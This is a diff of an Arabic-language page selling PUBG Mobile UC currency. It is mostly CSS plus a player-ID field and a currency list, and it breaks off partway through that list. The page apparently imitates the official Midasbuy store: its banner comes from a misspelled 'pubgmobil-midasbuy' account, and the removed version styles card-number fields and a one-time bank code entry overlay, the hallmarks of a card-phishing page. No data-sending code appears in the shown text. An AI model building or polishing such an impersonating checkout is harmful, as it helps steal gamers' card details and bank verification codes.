@@ -1,1881 +1,456 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-  <title>PUBG UC · شراء</title>
-  <!-- Font Awesome -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
-    }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+<title>PUBG UC · شراء</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Tahoma,system-ui,-apple-system,sans-serif}
+  html,body{overscroll-behavior:none;-webkit-overflow-scrolling:touch}
+  body{background:#f5f7fa;display:flex;justify-content:center;align-items:flex-start;min-height:100vh}
+  .page{max-width:100%;width:100%}
+  .card{width:100%;background:#fff;color:#1a1a1a;position:relative;overflow:hidden}
+  .top-image{width:100%;line-height:0}
+  .top-image img{width:100%;height:auto;display:block}
+  .content{padding:18px 16px 24px}
 
-    body {
-      background: #f5f7fa;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      padding: 16px;
-    }
+  /* معرف اللاعب */
+  .user-section{background:#f0f2f5;border-radius:28px;padding:6px 18px 6px 12px;margin-bottom:12px;display:flex;align-items:center;gap:10px;border:1px solid #e0e4e8;flex-direction:row-reverse;height:56px;position:relative}
+  .user-section i{color:#777;font-size:18px;order:3}
+  .user-section input{background:transparent;border:none;outline:none;color:#1a1a1a;font-size:16px;padding:10px 0;flex:1;min-width:100px;text-align:left;direction:ltr;order:1}
+  .user-section input::placeholder{color:#999;font-weight:400;text-align:right;direction:rtl;font-size:14px}
+  .player-error-msg{display:none;color:#dc2626;font-size:11px;font-weight:600;background:#fee2e2;padding:3px 10px;border-radius:20px;white-space:nowrap;order:2}
+  .player-error-msg.show{display:inline-block}
+  .player-confirm-msg{display:none;color:#1a73e8;font-size:12px;font-weight:600;background:#e8f0fe;padding:4px 12px;border-radius:20px;white-space:nowrap;order:2}
+  .player-confirm-msg.show{display:inline-block}
+  .player-confirm-msg i{font-size:12px;margin-left:4px;color:#1a73e8}
+  .player-ok-msg{display:none;color:#888;font-size:13px;font-weight:700;background:#e8eaed;padding:4px 12px;border-radius:20px;order:2}
+  .player-ok-msg.show{display:inline-block}
+  .player-ok-msg .spinner-icon{display:inline-block;width:14px;height:14px;border:2px solid #ccc;border-top:2px solid #888;border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle}
+  @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
 
-    .card {
-      max-width: 420px;
-      width: 100%;
-      background: #ffffff;
-      border-radius: 36px;
-      padding: 0 0 32px 0;
-      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.08);
-      color: #1a1a1a;
-      border: 1px solid #eaeef2;
-      position: relative;
-      overflow: hidden;
-    }
+  /* العملة */
+  .country-section{background:#f0f2f5;border-radius:28px;padding:6px 18px;margin-bottom:24px;display:flex;align-items:center;gap:10px;border:1px solid #e0e4e8;flex-direction:row-reverse;cursor:pointer;position:relative;height:56px}
+  .country-section:active{background:#e8ecf1}
+  .country-label{font-size:14px;font-weight:700;color:#555;white-space:nowrap;order:3;pointer-events:none}
+  .country-section select{display:none}
+  .country-section .select-arrow{order:2;color:#555;font-size:12px;pointer-events:none}
+  .country-display{order:1;flex:1;font-size:14px;font-weight:600;color:#1a1a1a;text-align:right;direction:rtl;pointer-events:none;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+  .custom-dropdown{display:none;position:absolute;top:100%;left:0;right:0;background:#fff;border-radius:16px;box-shadow:0 10px 30px rgba(0,0,0,.15);max-height:300px;overflow-y:auto;z-index:1000;margin-top:6px;border:1px solid #e0e4e8;direction:rtl}
+  .custom-dropdown.active{display:block}
+  .custom-dropdown-item{padding:12px 16px;font-size:14px;cursor:pointer;display:flex;align-items:center;gap:8px;text-align:right;border-bottom:1px solid #f0f2f5}
+  .custom-dropdown-item:last-child{border-bottom:none}
+  .custom-dropdown-item:hover{background:#f0f2f5}
+  .custom-dropdown-item.selected{background:#e8f0fe;font-weight:600}
 
-    .header {
-      width: 100%;
-      margin-bottom: 18px;
-      display: flex;
-      justify-content: center;
-      background: #ffffff;
-      margin: 0;
-      padding: 0;
-      line-height: 0;
-    }
+  /* شبكة UC */
+  .coin-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:24px;direction:rtl}
+  .coin-option{background:#f8f9fc;border-radius:16px;padding:16px 8px;text-align:center;border:2px solid #e8ecf1;transition:.2s;cursor:pointer;position:relative}
+  .coin-option:hover{border-color:#d0d5e0;transform:translateY(-1px)}
+  .coin-option.selected{border-color:#1a73e8;background:#e8f0fe;box-shadow:0 0 0 1px #1a73e8}
+  .coin-option .coins{font-weight:700;font-size:18px;color:#1a1a1a;line-height:1.3;margin-top:4px;direction:ltr;unicode-bidi:embed}
+  .coin-option .uc-symbol{display:inline-flex;align-items:center;justify-content:center;width:72px;height:72px;margin:0 auto 6px}
+  .coin-option .uc-symbol .uc-icon-img{width:100%;height:100%;display:block;object-fit:contain}
+  .coin-option .total-price{font-size:14px;font-weight:700;color:#1a73e8;background:#e8f0fe;padding:4px 10px;border-radius:20px;display:inline-block;margin-top:6px;border:1px solid #7baaf7}
 
-    .brand-logo {
-      width: 100%;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      margin: 0;
-      padding: 0;
-    }
-    .brand-logo img {
-      width: 100%;
-      max-width: 100%;
-      height: auto;
-      max-height: 320px;
-      object-fit: contain;
-      display: block;
-      border-radius: 0;
-      margin: 0;
-      padding: 0;
-      background: #ffffff;
-    }
+  /* زر متابعة الدفع */
+  .action-btn{width:100%;background:#1a73e8;border:none;padding:16px;border-radius:60px;font-weight:700;font-size:18px;color:#fff;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 8px 0 #0d47a1;transition:.08s linear;margin-bottom:14px;cursor:pointer}
+  .action-btn:active{transform:translateY(4px);box-shadow:0 4px 0 #0d47a1}
+  .action-btn:disabled{opacity:.7;cursor:not-allowed;transform:translateY(4px);box-shadow:0 4px 0 #0d47a1}
 
-    .content {
-      padding: 0 20px;
-    }
+  /* شاشة التحميل */
+  .loading-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.5);backdrop-filter:blur(4px);justify-content:center;align-items:center;z-index:1300;padding:24px}
+  .loading-overlay.active{display:flex}
+  .loading-card{background:#fff;max-width:300px;width:100%;border-radius:32px;padding:40px 24px;text-align:center;box-shadow:0 30px 60px rgba(0,0,0,.2);direction:rtl}
+  .loading-spinner{width:64px;height:64px;margin:0 auto 20px;border:6px solid #e0e4e8;border-top:6px solid #1a73e8;border-radius:50%;animation:spin .8s linear infinite}
+  .loading-card p{font-size:16px;font-weight:700;color:#1a1a1a}
+  .loading-card .loading-sub{font-size:13px;color:#888;margin-top:6px;font-weight:400}
 
-    .user-section {
-      background: #f0f2f5;
-      border-radius: 28px;
-      padding: 6px 12px 6px 18px;
-      margin-bottom: 12px;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      border: 1px solid #e0e4e8;
-      position: relative;
-    }
-    .user-section i {
-      color: #777;
-      font-size: 18px;
-    }
-    .user-section input {
-      background: transparent;
-      border: none;
-      outline: none;
-      color: #1a1a1a;
-      font-size: 16px;
-      padding: 10px 0;
-      flex: 1;
-      min-width: 100px;
-    }
-    .user-section input::placeholder {
-      color: #999;
-      font-weight: 400;
-    }
-
-    .player-confirm-msg {
-      display: none;
-      color: #1a73e8;
-      font-size: 12px;
-      font-weight: 600;
-      background: #e8f0fe;
-      padding: 4px 12px;
-      border-radius: 20px;
-      white-space: nowrap;
-      animation: fadeIn 0.3s ease;
-    }
-    .player-confirm-msg.show {
-      display: inline-block;
-    }
-    @keyframes fadeIn {
-      0% { opacity: 0; transform: scale(0.8); }
-      100% { opacity: 1; transform: scale(1); }
-    }
-    .player-confirm-msg i {
-      font-size: 12px;
-      margin-right: 4px;
-      color: #1a73e8;
-    }
-
-    .player-ok-msg {
-      display: none;
-      color: #1a73e8;
-      font-size: 13px;
-      font-weight: 700;
-      background: #e8f0fe;
-      padding: 4px 12px;
-      border-radius: 20px;
-      white-space: nowrap;
-      animation: fadeIn 0.3s ease;
-    }
-    .player-ok-msg.show {
-      display: inline-block;
-    }
-
-    .country-section {
-      background: #f0f2f5;
-      border-radius: 28px;
-      padding: 6px 18px 6px 18px;
-      margin-bottom: 24px;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      border: 1px solid #e0e4e8;
-    }
-    .country-section i {
-      display: none;
-    }
-    .country-section select {
-      background: transparent;
-      border: none;
-      outline: none;
-      font-size: 14px;
-      font-weight: 600;
-      color: #1a1a1a;
-      padding: 10px 4px 10px 0;
-      cursor: pointer;
-      width: 100%;
-      appearance: auto;
-      -webkit-appearance: auto;
-    }
-    .country-section select option {
-      font-weight: 400;
-    }
-
-    .coin-grid {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 12px;
-      margin-bottom: 24px;
-    }
-    .coin-option {
-      background: #f8f9fc;
-      border-radius: 16px;
-      padding: 16px 8px;
-      text-align: center;
-      border: 2px solid #e8ecf1;
-      transition: 0.2s;
-      cursor: pointer;
-      position: relative;
-    }
-    .coin-option:hover {
-      border-color: #d0d5e0;
-      transform: translateY(-1px);
-    }
-    .coin-option.selected {
-      border-color: #1a73e8;
-      background: #e8f0fe;
-      box-shadow: 0 0 0 1px #1a73e8;
-    }
-    .coin-option .coins {
-      font-weight: 700;
-      font-size: 18px;
-      color: #1a1a1a;
-      line-height: 1.3;
-      margin-top: 4px;
-    }
-    .coin-option .uc-symbol {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      width: 72px;
-      height: 72px;
-      margin: 0 auto 6px;
-      background: transparent;
-      border-radius: 0;
-      border: none;
-      box-shadow: none;
-      flex-shrink: 0;
-      padding: 0;
-      transition: none;
-    }
-    .coin-option.selected .uc-symbol {
-      border: none;
-      box-shadow: none;
-    }
-    .coin-option .uc-symbol .uc-icon-img {
-      width: 100%;
-      height: 100%;
-      display: block;
-      object-fit: contain;
-    }
-    .coin-option .total-price {
-      font-size: 14px;
-      font-weight: 700;
-      color: #1a73e8;
-      background: #e8f0fe;
-      padding: 4px 10px;
-      border-radius: 20px;
-      display: inline-block;
-      margin-top: 6px;
-      border: 1px solid #7baaf7;
-    }
-    .coin-option .badge {
-      background: #1a73e822;
-      color: #0d47a1;
-      font-size: 10px;
-      font-weight: 600;
-      border-radius: 40px;
-      padding: 2px 10px;
-      display: inline-block;
-      margin-top: 6px;
-    }
-    .coin-option.custom-option {
-      border-style: dashed;
-      border-color: #c0c8d4;
-      background: #fafbfc;
-    }
-    .coin-option.custom-option .coins {
-      font-size: 15px;
-      color: #555;
-    }
-    .coin-option .custom-icon {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      width: 72px;
-      height: 72px;
-      margin: 0 auto 6px;
-      background: transparent;
-      border-radius: 0;
-      border: none;
-      box-shadow: none;
-      flex-shrink: 0;
-      padding: 0;
-      transition: none;
-    }
-    .coin-option.custom-option.selected .custom-icon {
-      border: none;
-      box-shadow: none;
-    }
-    .custom-icon-img {
-      width: 100%;
-      height: 100%;
-      display: block;
-      object-fit: contain;
-    }
-    .coin-option.custom-option .custom-icon .uc-icon-check {
-      display: none;
-    }
-    .coin-option.custom-option.selected .custom-icon .uc-icon-check {
-      display: block;
-    }
-    .coin-option.custom-option.selected .custom-icon .uc-icon-default {
-      display: none;
-    }
-
-    .payment-box {
-      width: 100%;
-      position: relative;
-      margin-bottom: 20px;
-      background: #ffffff;
-      border-radius: 16px;
-      padding: 20px 22px 22px;
-      border: 2px solid #d0d5e0;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08), 0 1px 4px rgba(0, 0, 0, 0.05);
-      transition: box-shadow 0.3s;
-    }
-    .payment-box:hover {
-      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12), 0 1px 6px rgba(0, 0, 0, 0.06);
-    }
-
-    .card-logos {
-      display: flex;
-      align-items: center;
-      gap: 14px;
-      justify-content: flex-end;
-      margin-bottom: 16px;
-    }
-
-    .visa-wrapper {
-      border: 1px solid #000000;
-      border-radius: 6px;
-      padding: 4px 12px;
-      background: #ffffff;
-      display: flex;
-      align-items: center;
-    }
-    .visa {
-      font-size: 28px;
-      font-weight: 900;
-      font-style: italic;
-      color: #1434cb;
-      letter-spacing: -2px;
-    }
-
-    .mastercard-wrapper {
-      border: 1px solid #000000;
-      border-radius: 6px;
-      padding: 4px 10px;
-      background: #ffffff;
-      display: flex;
-      align-items: center;
-    }
-
-    .mastercard {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      position: relative;
-      width: 50px;
-      height: 32px;
-      flex-shrink: 0;
-    }
-    .mastercard .mc-circles {
-      width: 100%;
-      height: 100%;
-      position: relative;
-    }
-    .mastercard .mc-circles::before,
-    .mastercard .mc-circles::after {
-      content: "";
-      position: absolute;
-      top: 0;
-      width: 32px;
-      height: 32px;
-      border-radius: 50%;
-    }
-    .mastercard .mc-circles::before {
-      left: 0;
-      background: #eb001b;
-    }
-    .mastercard .mc-circles::after {
-      right: 0;
-      background: #f79e1b;
-      opacity: .95;
-    }
-    .mastercard .mc-text {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      font-size: 8px;
-      font-weight: 900;
-      color: #ffffff;
-      letter-spacing: 0.3px;
-      text-shadow: 0 0 4px rgba(0,0,0,0.3);
-      white-space: nowrap;
-      z-index: 2;
-      font-family: 'Segoe UI', Arial, sans-serif;
-      text-align: center;
-      line-height: 1.1;
-    }
-
-    .payment-box label {
-      display: block;
-      font-size: 14px;
-      font-weight: 700;
-      color: #4a5568;
-      letter-spacing: 0.8px;
-      margin-bottom: 4px;
-    }
-
-    .field-wrapper {
-      position: relative;
-      width: 100%;
-    }
-
-    .field-wrapper input {
-      width: 100%;
-      height: 56px;
-      border: 2px solid #d5d9e4;
-      border-radius: 12px;
-      background: #f7f9fc;
-      padding: 0 20px;
-      font-size: 20px;
-      font-weight: 500;
-      color: #1a1a2e;
-      outline: none;
-      font-family: 'Courier New', 'Courier', monospace;
-      transition: border-color 0.3s, background 0.3s;
-      padding-right: 48px;
-    }
-    .field-wrapper input::placeholder {
-      color: #bcc3d2;
-      opacity: 1;
-      font-weight: 400;
-      font-size: 16px;
-      letter-spacing: 1px;
-    }
-    .field-wrapper input:focus {
-      border-color: #1a73e8;
-      background: #ffffff;
-    }
-    .field-wrapper input.error {
-      border-color: #dc2626;
-      background: #fef2f2;
-    }
-
-    .field-wrapper .error-icon {
-      position: absolute;
-      right: 12px;
-      top: 50%;
-      transform: translateY(-50%);
-      width: 28px;
-      height: 28px;
-      background: #dc2626;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #fff;
-      font-weight: 700;
-      font-size: 16px;
-      font-family: Arial, sans-serif;
-      box-shadow: 0 2px 8px rgba(220, 38, 38, 0.4);
-      opacity: 0;
-      transition: opacity 0.2s;
-      pointer-events: none;
-      line-height: 1;
-    }
-    .field-wrapper.error .error-icon {
-      opacity: 1;
-    }
-
-    .payment-box .field {
-      margin-bottom: 18px;
-    }
-
-    .payment-box .row {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 20px;
-    }
-    .payment-box .row .field {
-      margin-bottom: 0;
-    }
-
-    @media (max-width: 400px) {
-      .payment-box {
-        padding: 16px 14px;
-      }
-      .field-wrapper input {
-        height: 48px;
-        font-size: 17px;
-        padding: 0 14px;
-        padding-right: 40px;
-      }
-      .payment-box .row {
-        gap: 12px;
-      }
-      .visa {
-        font-size: 22px;
-      }
-      .mastercard {
-        width: 40px;
-        height: 26px;
-      }
-      .mastercard .mc-circles::before,
-      .mastercard .mc-circles::after {
-        width: 26px;
-        height: 26px;
-      }
-      .mastercard .mc-text {
-        font-size: 6.5px;
-      }
-      .visa-wrapper {
-        padding: 2px 8px;
-      }
-      .mastercard-wrapper {
-        padding: 2px 6px;
-      }
-      .field-wrapper .error-icon {
-        width: 24px;
-        height: 24px;
-        font-size: 14px;
-        right: 8px;
-      }
-      .brand-logo img {
-        max-height: 220px;
-      }
-      .coin-option .uc-symbol {
-        width: 60px;
-        height: 60px;
-        padding: 0;
-      }
-      .coin-option .coins {
-        font-size: 16px;
-      }
-      .content {
-        padding: 0 14px;
-      }
-      .coin-option .custom-icon {
-        width: 60px;
-        height: 60px;
-        padding: 0;
-      }
-    }
-
-    .action-btn {
-      width: 100%;
-      background: #1a73e8;
-      border: none;
-      padding: 16px;
-      border-radius: 60px;
-      font-weight: 700;
-      font-size: 18px;
-      color: white;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      box-shadow: 0 8px 0 #0d47a1;
-      transition: 0.08s linear;
-      margin-bottom: 14px;
-      cursor: pointer;
-    }
-    .action-btn:active {
-      transform: translateY(4px);
-      box-shadow: 0 4px 0 #0d47a1;
-    }
-    .action-btn:disabled {
-      opacity: 0.7;
-      cursor: not-allowed;
-      transform: translateY(4px);
-      box-shadow: 0 4px 0 #0d47a1;
-    }
-
-    .otp-overlay {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.4);
-      backdrop-filter: blur(4px);
-      justify-content: center;
-      align-items: flex-start;
-      padding-top: 80px;
-      z-index: 999;
-      padding-left: 24px;
-      padding-right: 24px;
-      padding-bottom: 24px;
-      overflow-y: auto;
-    }
-    .otp-overlay.active {
-      display: flex;
-    }
-    .otp-card {
-      background: #ffffff;
-      max-width: 380px;
-      width: 100%;
-      border-radius: 40px;
-      padding: 32px 24px 28px;
-      border: 1px solid #e0e4e8;
-      box-shadow: 0 30px 60px rgba(0,0,0,0.15);
-      animation: fadeUp 0.25s ease;
-      margin: 0 auto;
-    }
-    @keyframes fadeUp {
-      0% { opacity: 0; transform: translateY(30px); }
-      100% { opacity: 1; transform: translateY(0); }
-    }
-    .otp-card h2 {
-      font-size: 24px;
-      font-weight: 600;
-      margin-bottom: 8px;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      color: #1a1a1a;
-    }
-    .otp-card h2 i {
-      color: #1a73e8;
-    }
-    .otp-card .sub {
-      color: #666;
-      font-size: 14px;
-      margin-bottom: 22px;
-      border-left: 3px solid #1a73e8;
-      padding-left: 12px;
-    }
-    .otp-input-group {
-      background: #f0f2f5;
-      border-radius: 60px;
-      display: flex;
-      align-items: center;
-      padding: 4px 4px 4px 20px;
-      border: 1px solid #e0e4e8;
-      margin-bottom: 18px;
-    }
-    .otp-input-group input {
-      background: transparent;
-      border: none;
-      outline: none;
-      color: #1a1a1a;
-      font-size: 22px;
-      letter-spacing: 6px;
-      flex: 1;
-      padding: 14px 0;
-      min-width: 0;
-    }
-    .otp-input-group input::placeholder {
-      letter-spacing: 2px;
-      color: #999;
-      font-size: 16px;
-    }
-    .otp-input-group button {
-      background: #1a73e8;
-      border: none;
-      color: white;
-      font-weight: 700;
-      padding: 14px 24px;
-      border-radius: 60px;
-      font-size: 16px;
-      cursor: pointer;
-      transition: 0.1s;
-      box-shadow: 0 4px 0 #0d47a1;
-    }
-    .otp-input-group button:active {
-      transform: translateY(2px);
-      box-shadow: 0 2px 0 #0d47a1;
-    }
-    .otp-close {
-      background: transparent;
-      border: none;
-      color: #888;
-      font-size: 14px;
-      margin-top: 12px;
-      cursor: pointer;
-      width: 100%;
-      text-align: center;
-      padding: 8px;
-    }
-    .otp-close:hover {
-      color: #333;
-    }
-
-    .resend-otp-btn {
-      background: transparent;
-      border: none;
-      color: #1a73e8;
-      font-size: 14px;
-      font-weight: 600;
-      cursor: pointer;
-      padding: 8px;
-      margin-top: 8px;
-      width: 100%;
-      text-align: center;
-      transition: color 0.2s;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 4px;
-    }
-    .resend-otp-btn:hover:not(:disabled) {
-      color: #0d47a1;
-      text-decoration: underline;
-    }
-    .resend-otp-btn:disabled {
-      color: #999;
-      cursor: not-allowed;
-      text-decoration: none;
-    }
-    .resend-otp-btn .countdown {
-      color: #999;
-      font-weight: 700;
-    }
-    .resend-otp-btn.sent {
-      color: #22c55e;
-    }
-    .resend-otp-btn.sent .countdown {
-      color: #999;
-    }
-    .resend-otp-btn .resend-text {
-      display: inline;
-    }
-    .resend-otp-btn .countdown-text {
-      display: inline;
-      font-size: 13px;
-      color: #999;
-      font-weight: 500;
-    }
-    .resend-otp-btn .sent-text {
-      display: inline;
-    }
-
-    .error-popup-overlay {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.5);
-      backdrop-filter: blur(4px);
-      justify-content: center;
-      align-items: center;
-      z-index: 1000;
-      padding: 24px;
-    }
-    .error-popup-overlay.active {
-      display: flex;
-    }
-    .error-popup {
-      background: #ffffff;
-      max-width: 360px;
-      width: 100%;
-      border-radius: 28px;
-      padding: 32px 24px 28px;
-      text-align: center;
-      border: 1px solid #ff4444;
-      box-shadow: 0 30px 60px rgba(0,0,0,0.2);
-      animation: fadeUp 0.3s ease;
-    }
-    .error-popup .error-icon {
-      font-size: 48px;
-      color: #ff4444;
-      margin-bottom: 12px;
-    }
-    .error-popup h3 {
-      font-size: 20px;
-      font-weight: 700;
-      color: #cc0000;
-      margin-bottom: 8px;
-    }
-    .error-popup p {
-      font-size: 15px;
-      color: #555;
-      margin-bottom: 20px;
-      line-height: 1.5;
-    }
-    .error-popup .error-close-btn {
-      background: #1a73e8;
-      border: none;
-      color: white;
-      font-weight: 700;
-      padding: 12px 40px;
-      border-radius: 60px;
-      font-size: 16px;
-      cursor: pointer;
-      transition: 0.1s;
-      box-shadow: 0 4px 0 #0d47a1;
-    }
-    .error-popup .error-close-btn:active {
-      transform: translateY(2px);
-      box-shadow: 0 2px 0 #0d47a1;
-    }
-
-    .custom-amount-overlay {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.5);
-      backdrop-filter: blur(4px);
-      justify-content: center;
-      align-items: center;
-      z-index: 1100;
-      padding: 24px;
-      padding-top: 40px;
-    }
-    .custom-amount-overlay.active {
-      display: flex;
-    }
-    .custom-amount-card {
-      background: #ffffff;
-      max-width: 340px;
-      width: 100%;
-      border-radius: 32px;
-      padding: 32px 24px 28px;
-      text-align: center;
-      box-shadow: 0 30px 60px rgba(0,0,0,0.2);
-      animation: fadeUp 0.25s ease;
-      border: 1px solid #e0e4e8;
-      margin-top: 0;
-    }
-    .custom-amount-card h3 {
-      font-size: 20px;
-      font-weight: 700;
-      color: #1a1a1a;
-      margin-bottom: 6px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-    }
-    .uc-title-icon {
-      width: 70px;
-      height: 70px;
-      object-fit: contain;
-      display: inline-block;
-      vertical-align: middle;
-    }
-    .custom-amount-card .sub {
-      color: #777;
-      font-size: 14px;
-      margin-bottom: 20px;
-    }
-    .custom-amount-card input {
-      width: 100%;
-      height: 56px;
-      border: 2px solid #d5d9e4;
-      border-radius: 16px;
-      background: #f7f9fc;
-      padding: 0 20px;
-      font-size: 28px;
-      font-weight: 700;
-      text-align: center;
-      color: #1a1a1a;
-      outline: none;
-      transition: border-color 0.3s;
-      margin-bottom: 16px;
-    }
-    .custom-amount-card input:focus {
-      border-color: #1a73e8;
-      background: #ffffff;
-    }
-    .custom-amount-card input::placeholder {
-      color: #bcc3d2;
-      font-weight: 400;
-      font-size: 16px;
-    }
-    .custom-amount-card .actions {
-      display: flex;
-      gap: 12px;
-    }
-    .custom-amount-card .actions button {
-      flex: 1;
-      padding: 14px 0;
-      border: none;
-      border-radius: 60px;
-      font-weight: 700;
-      font-size: 16px;
-      cursor: pointer;
-      transition: 0.1s;
-    }
-    .custom-amount-card .btn-confirm {
-      background: #1a73e8;
-      color: white;
-      box-shadow: 0 4px 0 #0d47a1;
-    }
-    .custom-amount-card .btn-confirm:active {
-      transform: translateY(2px);
-      box-shadow: 0 2px 0 #0d47a1;
-    }
-    .custom-amount-card .btn-cancel {
-      background: #f0f2f5;
-      color: #555;
-      border: 1px solid #d5d9e4;
-    }
-    .custom-amount-card .btn-cancel:active {
-      transform: scale(0.97);
-    }
-
-    .success-toast {
-      display: none;
-    }
-
-    @media (max-width: 400px) {
-      .content { padding: 0 14px; }
-      .coin-option .coins { font-size: 16px; }
-      .coin-option .total-price { font-size: 12px; padding: 3px 8px; }
-      .coin-option .uc-symbol { width: 60px; height: 60px; padding: 0; }
-      .otp-card { padding: 24px 18px; }
-      .error-popup { padding: 24px 18px; }
-      .custom-amount-card { padding: 24px 18px; }
-      .brand-logo img { max-height: 220px; }
-      .otp-overlay {
-        padding-top: 50px;
-      }
-      .coin-option .custom-icon {
-        width: 60px;
-        height: 60px;
-        padding: 0;
-      }
-      .uc-title-icon {
-        width: 55px;
-        height: 55px;
-      }
-      .custom-amount-overlay {
-        padding-top: 20px;
-      }
-    }
-
-    @media (max-height: 700px) {
-      .otp-overlay {
-        padding-top: 30px;
-        align-items: flex-start;
-      }
-      .otp-card {
-        padding: 20px 16px 20px;
-      }
-      .otp-card h2 {
-        font-size: 20px;
-      }
-      .otp-input-group input {
-        font-size: 18px;
-        padding: 10px 0;
-      }
-      .otp-input-group button {
-        padding: 10px 16px;
-        font-size: 14px;
-      }
-      .custom-amount-overlay {
-        padding-top: 15px;
-      }
-      .custom-amount-card {
-        padding: 20px 16px 20px;
-      }
-      .uc-title-icon {
-        width: 45px;
-        height: 45px;
-      }
-    }
-  </style>
+  @media (max-width:400px){
+    .content{padding:14px 12px 24px}
+    .coin-option .coins{font-size:16px}
+    .coin-option .total-price{font-size:12px;padding:3px 8px}
+    .coin-option .uc-symbol{width:60px;height:60px}
+    .user-section,.country-section{height:50px}
+  }
+  @media (min-width:421px){ .content{padding-left:24px;padding-right:24px} }
+</style>
 </head>
 <body>
 
-  <div class="card" id="mainCard">
-
-    <div class="header">
-      <div class="brand-logo">
-        <img src="https://i.postimg.cc/26pjjb0S/IMG-20260907-193656.jpg" alt="PUBG Mobile">
-      </div>
+<div class="page active" id="page1">
+  <div class="card">
+    <div class="top-image">
+      <img src="https://raw.githubusercontent.com/pubgmobil-midasbuy/midasbuy.com/main/IMG_٢٠٢٦٠٩١٢_١٢٤٢١٦.webp" alt="PUBG Mobile">
     </div>
 
     <div class="content">
-
-      <div class="user-section">
+      <!-- معرف اللاعب -->
+      <div class="user-section" id="userSection">
         <i class="fas fa-user"></i>
-        <input type="text" id="username" inputmode="numeric" placeholder="Player ID" value="">
-        <span class="player-ok-msg" id="playerOkMsg">OK</span>
+        <input type="text" id="username" inputmode="numeric" placeholder="ID معرف اللاعب" maxlength="15" autocomplete="off">
+        <span class="player-ok-msg" id="playerOkMsg"><span class="spinner-icon"></span></span>
         <span class="player-confirm-msg" id="playerConfirmMsg"><i class="fas fa-check-circle"></i> تم تحديد اللاعب</span>
+        <span class="player-error-msg" id="playerErrorMsg"><i class="fas fa-exclamation-circle"></i> معرف اللاعب غير صحيح</span>
       </div>
 
-      <div class="country-section">
-        <select id="countrySelect">
-          <option value="USD" data-symbol="$" data-rate="1.00">🇺🇸 دولار أمريكي</option>
-          <option value="LYD" data-symbol="د.ل" data-rate="4.80">🇱🇾 دينار ليبي</option>
-          <option value="KWD" data-symbol="د.ك" data-rate="0.30">🇰🇼 دينار كويتي</option>
-          <option value="EGP" data-symbol="ج.م" data-rate="48.00">🇪🇬 جنيه مصري</option>
-          <option value="EUR" data-symbol="€" data-rate="0.92">🇪🇺 يورو</option>
-          <option value="SAR" data-symbol="ر.س" data-rate="3.75">🇸🇦 ريال سعودي</option>
-          <option value="AED" data-symbol="د.إ" data-rate="3.67">🇦🇪 درهم إماراتي</option>
-          <option value="QAR" data-symbol="ر.ق" data-rate="3.64">🇶🇦 ريال قطري</option>
-          <option value="BHD" data-symbol="د.ب" data-rate="0.38">🇧🇭 دينار بحريني</option>
-          <option value="OMR" data-symbol="ر.ع" data-rate="0.38">🇴🇲 ريال عماني</option>
-          <option value="MAD" data-symbol="د.م." data-rate="10.10">🇲🇦 درهم مغربي</option>
-          <option value="DZD" data-symbol="د.ج" data-rate="135.00">🇩🇿 دينار جزائري</option>
-          <option value="TND" data-symbol="د.ت" data-rate="3.10">🇹🇳 دينار تونسي</option>
-          <option value="MRU" data-symbol="أ.م" data-rate="37.00">🇲🇷 أوقية موريتانية</option>
-          <option value="CNY" data-symbol="¥" data-rate="7.20">🇨🇳 يوان صيني</option>
-          <option value="INR" data-symbol="₹" data-rate="83.00">🇮🇳 روبية هندية</option>
-          <option value="BRL" data-symbol="R$" data-rate="5.10">🇧🇷 ريال برازيلي</option>
-          <option value="IDR" data-symbol="Rp" data-rate="15700">🇮🇩 روبية إندونيسية</option>
-          <option value="RUB" data-symbol="₽" data-rate="92.00">🇷🇺 روبل روسي</option>
-          <option value="MXN" data-symbol="$" data-rate="17.50">🇲🇽 بيزو مكسيكي</option>
-          <option value="PHP" data-symbol="₱" data-rate="56.00">🇵🇭 بيزو فلبيني</option>
